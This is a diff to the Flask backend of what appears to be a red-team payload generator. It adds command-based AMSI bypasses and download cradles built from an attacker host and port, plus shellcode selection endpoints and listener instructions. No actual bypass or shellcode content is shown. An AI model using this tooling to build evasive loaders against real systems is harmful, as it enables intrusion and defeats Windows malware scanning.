@@ -66,11 +66,13 @@ def load_amsi_bypasses():
         with open(ps_features_path, 'r') as f:
             features = yaml.safe_load(f) or []
         
-        # Filter for AMSI bypasses
+        # Filter for AMSI bypasses (with either 'code' or 'command')
         for feature in features:
-            if feature.get('type') == 'amsi' and 'code' in feature:
-                name = feature.get('name', 'Unknown')
-                bypasses[name] = feature.get('code', '').strip()
+            if feature.get('type') == 'amsi':
+                if 'code' in feature or 'command' in feature:
+                    name = feature.get('name', 'Unknown')
+                    # Store the feature type so UI knows it's valid
+                    bypasses[name] = feature.get('code' if 'code' in feature else 'command', '').strip()
     except Exception as e:
         print(f"Warning: Failed to load AMSI bypasses from ps-features.yaml: {e}", file=sys.stderr)
     
@@ -98,11 +100,36 @@ def inject_amsi_bypass_launch_instructions(launch_instructions: str, bypass_meth
             bypass_feature = feature
             break
     
-    if not bypass_feature or 'code' not in bypass_feature:
+    # Check for either 'code' or 'command' field
+    if not bypass_feature:
+        return launch_instructions
+    
+    if 'code' not in bypass_feature and 'command' not in bypass_feature:
         return launch_instructions
     
     try:
-        bypass_code = bypass_feature.get('code', '').strip()
+        # Get bypass code - either from 'code' template or 'command' execution
+        if 'command' in bypass_feature:
+            # Execute command to get bypass code
+            command_template = bypass_feature.get('command', '').strip()
+            try:
+                result = subprocess.run(
+                    command_template,
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    timeout=30
+                )
+                if result.returncode == 0:
+                    bypass_code = result.stdout.strip()
+                else:
+                    print(f"Warning: AMSI bypass command failed: {command_template}", file=sys.stderr)
+                    return launch_instructions
+            except Exception as e:
+                print(f"Warning: AMSI bypass command error: {e}", file=sys.stderr)
+                return launch_instructions
+        else:
+            bypass_code = bypass_feature.get('code', '').strip()
         
         # Apply obfuscation to bypass code if requested and allowed
         if obf_method and not bypass_feature.get('no-obf', False):
@@ -415,6 +442,47 @@ def extract_csharp_metadata(source_file: Path, obfuscation_map: dict = None) -> 
     return metadata
 
 
+def process_conditional_blocks(code: str, variables: dict) -> str:
+    """Process conditional blocks in the format {if varname}content{fi}
+    
+    If the variable is empty or None, the entire block (including content) is removed.
+    If the variable has a value, the block markers are removed and content is kept.
+    
+    Args:
+        code: Template code with conditional blocks
+        variables: Dictionary of variable names to their values
+        
+    Returns:
+        Processed code with conditional blocks handled
+    """
+    import re
+    
+    # Pattern to match {if varname}...{fi}
+    pattern = r'\{if\s+(\w+)\}(.*?)\{fi\}'
+    
+    def replace_conditional(match):
+        var_name = match.group(1)
+        content = match.group(2)
+        
+        # Check if variable exists and has a value
+        var_value = variables.get(var_name, '')
+        
+        if var_value:
+            # Variable has value, keep the content
+            return content
+        else:
+            # Variable is empty/None, remove the entire block
+            return ''
+    
+    # Process all conditional blocks
+    result = re.sub(pattern, replace_conditional, code, flags=re.DOTALL)
+    
+    # Clean up multiple consecutive spaces (collapse to single space)
+    result = re.sub(r' +', ' ', result)
+    
+    return result
+
+
 def generate_cradle(cradle_name: str, lhost: str, lport: int, output_file: str, obf_method: str = '', 
                    namespace: str = '', class_name: str = '', entry_point: str = '', args: str = '') -> Tuple[str, str]:
     """Generate a download cradle from ps-features.yaml
@@ -440,8 +508,14 @@ def generate_cradle(cradle_name: str, lhost: str, lport: int, output_file: str, 
             cradle_feature = feature
             break
     
-    if not cradle_feature or 'code' not in cradle_feature:
-        return '', ''
+    if not cradle_feature:
+        error_msg = f"Cradle '{cradle_name}' not found in ps-features.yaml"
+        return '', error_msg
+    
+    # Check for either 'code' or 'command' field
+    if 'code' not in cradle_feature and 'command' not in cradle_feature:
+        error_msg = f"Cradle '{cradle_name}' is missing 'code' or 'command' field (found: {list(cradle_feature.keys())})"
+        return '', error_msg
     
     # Build base URL based on port (without output_file)
     if lport == 443:
@@ -451,16 +525,75 @@ def generate_cradle(cradle_name: str, lhost: str, lport: int, output_file: str, 
     else:
         url = f'http://{lhost}:{lport}'
     
-    # Generate cradle code
-    cradle_code = cradle_feature.get('code', '').strip()
-    cradle_code = cradle_code.replace('{url}', url)
-    cradle_code = cradle_code.replace('{output_file}', output_file)
-    cradle_code = cradle_code.replace('{namespace}', namespace)
-    cradle_code = cradle_code.replace('{class}', class_name)
-    cradle_code = cradle_code.replace('{entry_point}', entry_point)
-    cradle_code = cradle_code.replace('{args}', args)
+    # Prepare variables for substitution
+    variables = {
+        'args': args,
+        'namespace': namespace,
+        'class': class_name,
+        'entry_point': entry_point,
+        'output_file': output_file,
+        'url': url,
+        'lhost': lhost,
+        'lport': str(lport)
+    }
     
-    command_used = ''
+    # Check if this is a command-based cradle or code-based cradle
+    if 'command' in cradle_feature:
+        # Command-based: Execute the command and use its output
+        command_template = cradle_feature.get('command', '').strip()
+        
+        # Process conditional blocks in command
+        command_template = process_conditional_blocks(command_template, variables)
+        
+        # Replace variables in command
+        for key, value in variables.items():
+            command_template = command_template.replace(f'{{{key}}}', value)
+        
+        try:
+            # Execute the command
+            result = subprocess.run(
+                command_template,
+                shell=True,
+                capture_output=True,
+                text=True,
+                timeout=120
+            )
+            
+            if result.returncode == 0:
+                cradle_code = result.stdout.strip()
+                command_used = command_template
+            else:
+                error_msg = f"Command execution failed (exit code {result.returncode})\n"
+                error_msg += f"Command: {command_template}\n"
+                if result.stderr:
+                    error_msg += f"Error: {result.stderr}"
+                return '', error_msg
+        except subprocess.TimeoutExpired:
+            error_msg = f"Command execution timed out after 120s\n"
+            error_msg += f"Command: {command_template}"
+            return '', error_msg
+        except Exception as e:
+            error_msg = f"Command execution error: {str(e)}\n"
+            error_msg += f"Command: {command_template}"
+            return '', error_msg
+    else:
+        # Code-based: Use as template
+        cradle_code = cradle_feature.get('code', '').strip()
+        
+        # Process conditional blocks first (before variable replacement)
+        cradle_code = process_conditional_blocks(cradle_code, variables)
+        
+        # Then do standard variable replacement
+        cradle_code = cradle_code.replace('{url}', url)
+        cradle_code = cradle_code.replace('{output_file}', output_file)
+        cradle_code = cradle_code.replace('{namespace}', namespace)
+        cradle_code = cradle_code.replace('{class}', class_name)
+        cradle_code = cradle_code.replace('{entry_point}', entry_point)
+        cradle_code = cradle_code.replace('{args}', args)
+        cradle_code = cradle_code.replace('{lhost}', lhost)
+        cradle_code = cradle_code.replace('{lport}', str(lport))
+        
+        command_used = ''
     
     # Apply obfuscation if requested and allowed
     if obf_method and not cradle_feature.get('no-obf', False):
@@ -509,6 +642,13 @@ def generate_cradle(cradle_name: str, lhost: str, lport: int, output_file: str, 
                 if result.returncode == 0 and os.path.exists(tmp_out_path):
                     with open(tmp_out_path, 'r') as f:
                         cradle_code = f.read().strip()
+                else:
+                    # Obfuscation failed - return error with command details
+                    error_msg = f"Obfuscation command failed (exit code {result.returncode})\\n"
+                    error_msg += f"Command: {command}\\n"
+                    if result.stderr:
+                        error_msg += f"Error: {result.stderr}"
+                    return '', error_msg
                 
                 # Clean up
                 try:
@@ -517,7 +657,9 @@ def generate_cradle(cradle_name: str, lhost: str, lport: int, output_file: str, 
                         os.unlink(tmp_out_path)
                 except:
                     pass
-            except Exception:
+            except subprocess.TimeoutExpired:
+                error_msg = f"Obfuscation command timed out after 120s\\n"
+                error_msg += f"Command: {command_used}"
                 # Clean up on error
                 try:
                     os.unlink(tmp_in_path)
@@ -525,6 +667,19 @@ def generate_cradle(cradle_name: str, lhost: str, lport: int, output_file: str, 
                         os.unlink(tmp_out_path)
                 except:
                     pass
+                return '', error_msg
+            except Exception as e:
+                error_msg = f"Obfuscation error: {str(e)}"
+                if command_used:
+                    error_msg += f"\\nCommand: {command_used}"
+                # Clean up on error
+                try:
+                    os.unlink(tmp_in_path)
+                    if os.path.exists(tmp_out_path):
+                        os.unlink(tmp_out_path)
+                except:
+                    pass
+                return '', error_msg
     
     return cradle_code, command_used
 
@@ -856,13 +1011,16 @@ def get_ps_cradles():
     
     for feature in ps_features:
         feature_type = feature.get('type', '')
+        # Check both 'code' and 'command' fields for variable usage
         code = feature.get('code', '')
+        command = feature.get('command', '')
+        content = code or command
         
         # Determine which variables this cradle uses
-        uses_namespace = '{namespace}' in code
-        uses_class = '{class}' in code
-        uses_entry_point = '{entry_point}' in code
-        uses_args = '{args}' in code
+        uses_namespace = '{namespace}' in content
+        uses_class = '{class}' in content
+        uses_entry_point = '{entry_point}' in content
+        uses_args = '{args}' in content
         
         cradle_info = {
             'name': feature.get('name'),
@@ -1041,6 +1199,71 @@ def validate_parameter():
         }), 400
 
 
+@app.route('/api/shellcodes')
+def get_shellcodes():
+    """Get all available shellcode configurations"""
+    try:
+        from src.core.shellcode_loader import ShellcodeLoader
+        
+        shellcodes_path = config.shellcodes_config
+        if not shellcodes_path.exists():
+            return jsonify({'shellcodes': [], 'error': 'Shellcodes configuration file not found'})
+        
+        loader = ShellcodeLoader(shellcodes_path)
+        shellcodes = loader.get_all_shellcodes()
+        
+        # Convert to list of dicts for JSON
+        shellcodes_list = []
+        for name, shellcode_config in shellcodes.items():
+            shellcodes_list.append({
+                'name': shellcode_config.name,
+                'parameters': shellcode_config.parameters,
+                'has_listener': shellcode_config.listener is not None
+            })
+        
+        return jsonify({'shellcodes': shellcodes_list})
+    except Exception as e:
+        return jsonify({'shellcodes': [], 'error': str(e)}), 500
+
+
+@app.route('/api/shellcode/<name>')
+def get_shellcode(name):
+    """Get a specific shellcode configuration by name"""
+    try:
+        from src.core.shellcode_loader import ShellcodeLoader
+        
+        shellcodes_path = config.shellcodes_config
+        if not shellcodes_path.exists():
+            return jsonify({'error': 'Shellcodes configuration file not found'}), 404
+        
+        loader = ShellcodeLoader(shellcodes_path)
+        shellcode_config = loader.get_shellcode(name)
+        
+        if not shellcode_config:
+            return jsonify({'error': f'Shellcode configuration "{name}" not found'}), 404
+        
+        # Resolve {config.*} placeholders in parameter defaults
+        resolved_params = []
+        for param in shellcode_config.parameters:
+            param_copy = param.copy()
+            default = param_copy.get('default', '')
+            if isinstance(default, str) and default.startswith('{config.'):
+                config_key = default[8:-1]  # Extract key from {config.key}
+                resolved_value = getattr(config, config_key, None)
+                if resolved_value is not None:
+                    param_copy['default'] = str(resolved_value)
+            resolved_params.append(param_copy)
+        
+        return jsonify({
+            'name': shellcode_config.name,
+            'parameters': resolved_params,
+            'has_listener': shellcode_config.listener is not None
+        })
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+
+
 @app.route('/api/generate', methods=['POST'])
 def generate_payload():
     """Generate a payload from recipe and parameters"""
@@ -1109,6 +1332,48 @@ def generate_payload():
             elif param_def.get('default') is not None:
                 # Use default value if no value provided
                 validated_params[param_name] = param_def.get('default')
+        
+        # Validate and include shellcode-specific parameters
+        shellcode_steps = [p for p in recipe_obj.preprocessing if p.get('type') == 'shellcode']
+        for shellcode_step in shellcode_steps:
+            output_var = shellcode_step.get('output_var', 'raw_shellcode')
+            selection_key = f"{output_var}_shellcode_selection"
+            selected_shellcode_name = preprocessing_selections.get(selection_key)
+            
+            if selected_shellcode_name:
+                # Load the shellcode config to get its parameters
+                from src.core.shellcode_loader import ShellcodeLoader
+                try:
+                    shellcodes_path = config.shellcodes_config
+                    if shellcodes_path.exists():
+                        loader = ShellcodeLoader(shellcodes_path)
+                        shellcode_config = loader.get_shellcode(selected_shellcode_name)
+                        
+                        if shellcode_config:
+                            # Validate and add each shellcode parameter
+                            for param_def in shellcode_config.parameters:
+                                param_name = param_def.get('name')
+                                value = parameters.get(param_name)
+                                
+                                # Validate this parameter
+                                validator.validate_parameter(param_def, value)
+                                
+                                # Store validated value (convert types as needed)
+                                if value is not None and value != '':
+                                    param_type = param_def.get('type', 'string')
+                                    if param_type == 'integer':
+                                        validated_params[param_name] = int(value)
+                                    elif param_type == 'port':
+                                        validated_params[param_name] = int(value)
+                                    elif param_type == 'bool':
+                                        validated_params[param_name] = value if isinstance(value, bool) else value == 'true'
+                                    else:
+                                        validated_params[param_name] = value
+                                elif param_def.get('default') is not None:
+                                    # Use default value if no value provided
+                                    validated_params[param_name] = param_def.get('default')
+                except Exception as e:
+                    print(f"Warning: Failed to load shellcode parameters: {e}")
                 
     except ValidationError as e:
         return jsonify({'error': f'Validation error: {e}'}), 400
@@ -1191,6 +1456,22 @@ def generate_payload():
                             # Replace with the selected option
                             selected_option = options[selected_index]
                             resolved_preprocessing.append(selected_option)
+                    elif step.get('type') == 'shellcode':
+                        # This is a shellcode step - add the selected shellcode name to parameters
+                        step_name = step.get('name', 'shellcode')
+                        output_var = step.get('output_var', 'raw_shellcode')
+                        
+                        # Get the selected shellcode name from preprocessing_selections
+                        # The key format is: <output_var>_shellcode_selection
+                        selection_key = f"{output_var}_shellcode_selection"
+                        selected_shellcode_name = preprocessing_selections.get(selection_key)
+                        
+                        if selected_shellcode_name:
+                            # Add the shellcode name to validated_params so it's available during preprocessing
+                            validated_params[f"{output_var}_shellcode_name"] = selected_shellcode_name
+                        
+                        # Keep the shellcode preprocessing step as-is
+                        resolved_preprocessing.append(step)
                     else:
                         # Regular preprocessing step - keep as is
                         resolved_preprocessing.append(step)
@@ -1207,6 +1488,17 @@ def generate_payload():
                     
                     # Process launch instructions
                     final_launch_instructions = recipe_obj.launch_instructions
+                    
+                    # Step -1: Generate listener instructions if shellcode was used
+                    listener_code = ''
+                    for var_name, var_value in builder.variables.items():
+                        # Check if this is a shellcode config variable
+                        if isinstance(var_value, dict) and 'listener' in var_value and var_value.get('listener'):
+                            # Render listener command with current variables
+                            from jinja2 import Template
+                            listener_template = var_value['listener']
+                            listener_code = Template(listener_template).render(**builder.variables)
+                            break  # Only use the first shellcode listener found
                     
                     # Step 0: Generate cradle if requested (FIRST)
                     cradle_code = ''
@@ -1279,7 +1571,9 @@ def generate_payload():
                                 cradle_step['output'] = cradle_output
                             else:
                                 cradle_step['status'] = 'failed'
-                                cradle_step['error'] = 'Failed to generate cradle'
+                                # Use the error message returned from generate_cradle
+                                error_detail = command_used if command_used else 'Failed to generate cradle'
+                                cradle_step['error'] = error_detail
                     
                     # Step 1: Insert AMSI bypass if requested (BEFORE obfuscation)
                     if (build_options.get('amsi_bypass_launch', False) and 
@@ -1342,6 +1636,14 @@ def generate_payload():
                             final_launch_instructions = cradle_section + final_launch_instructions
                         else:
                             final_launch_instructions = cradle_section
+                    
+                    # Step 4: Prepend listener to launch instructions if shellcode was used
+                    if listener_code:
+                        listener_section = f"# Listener\n\n```shell\n{listener_code}\n```\n\n"
+                        if final_launch_instructions:
+                            final_launch_instructions = listener_section + final_launch_instructions
+                        else:
+                            final_launch_instructions = listener_section
                     
                     build_sessions[session_id]['launch_instructions'] = final_launch_instructions
                     
